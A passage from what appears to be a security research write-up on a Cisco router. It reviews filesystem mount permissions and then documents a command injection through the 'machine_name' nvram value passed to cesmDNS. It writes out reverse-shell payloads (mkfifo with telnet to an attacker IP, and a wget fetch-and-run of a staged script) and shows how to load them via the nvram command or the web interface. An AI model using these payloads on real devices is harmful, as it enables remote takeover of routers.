## 3. Filesystem permissions

```console
# mount
rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro)
devfs on /dev type tmpfs (rw)
sysfs on /sys type sysfs (rw)
proc on /proc type proc (rw)
ramfs on /tmp type ramfs (rw)
devpts on /dev/pts type devpts (rw)
```

* Notice that there are a few "mount points" of the filesystem that are readable + writable (rw). However, there are a few caveats, explained for each part:

1. `rootfs (/)`

* Shown as read+writable (**rw**)
* However, it maps to the `/dev/root` partition when the kernel is loaded
* Hence, it inherits the permissions of `/dev/root`, and will be read-only (**ro**)

2. `devfs (/dev)`

* read+writable

3. `sysfs (/sys)`

* Shown as read+writable (**rw**)
* However, it is mainly for the kernel to generate data on the fly
* Files can't be created directly, but existing ones (created by the kernel) can be modified

4. `proc (/proc)`

* Shown as readable+writable (**rw**)
* Similar to the `sysfs`, files can't be created, but existing ones (created by the kernel) can be modified:
  * Eg. `echo 1 > /proc/sys/net/ipv4/ip_forward`

5. `ramfs (/tmp)`

* read+writable

## 4. Command injection vulnerability discovered&#x20;

### 4.1 Overview of vulnerability

From viewing the boot logs or process list (`ps w`), we can see the `cesmDNS` command being executed with a user-controlled value option:

* `-h Cisco58059`: this appears to be the device name
* `-l 192.168.1.1`: this appears to be the configured IP address

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

I have only tested the command injection with a value given to the `-h` flag, but `-l` is believed to work too.&#x20;

The nvram field **machine\_name** was found to control the device name. We can set this nvram value with the following payload to initiate a reverse shell:

```sh
;mkfifo /tmp/f && telnet [ATTACKER IP] [LISTEN PORT] < /tmp/f | /bin/sh /tmp/f; 
```

However, it will get truncated when executed:

<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

A workaround is to host a file (with a short name such as **'t'**) from our host machine, and update the payload to download this file with `wget`, and execute it with `sh`&#x20;

`;wget http://[ATTACKER IP]:[LISTEN PORT]/t -O /tmp/t && sh /tmp/t;`

> Executing with `sh /tmp/t` instead of `./tmp/f` allows us to save command space by removing the need to give execute permissions to the file (`chmod +x /tmp/t`)



**Content of ‘t’ file**

```sh
mkfifo /tmp/f
cat /tmp/f | /bin/sh 2>&1 | telnet [ATTACKER IP] [LISTEN PORT] > /tmp/f &
```

**Start the Python3 server to host the ‘t’ file (port 6666 in this case)**

### 4.2 How to install the payload

#### 4.2.1 Directly from the shell (`nvram` command)

```console
# nvram set machine_name=";wget http://[ATTACKER IP]:[LISTEN PORT]/t -O /tmp/t && sh /tmp/t;"
```

#### 4.2.2 HTTP POST request

I investigated the HTTP POST request used to update the "Router Name" field in the web interface. This value is found to directly update the **machine\_name** nvram value, providing us a direct method to load the payload. Additionally this request also restarts the `cesmDNS` command and re-applies the command injection
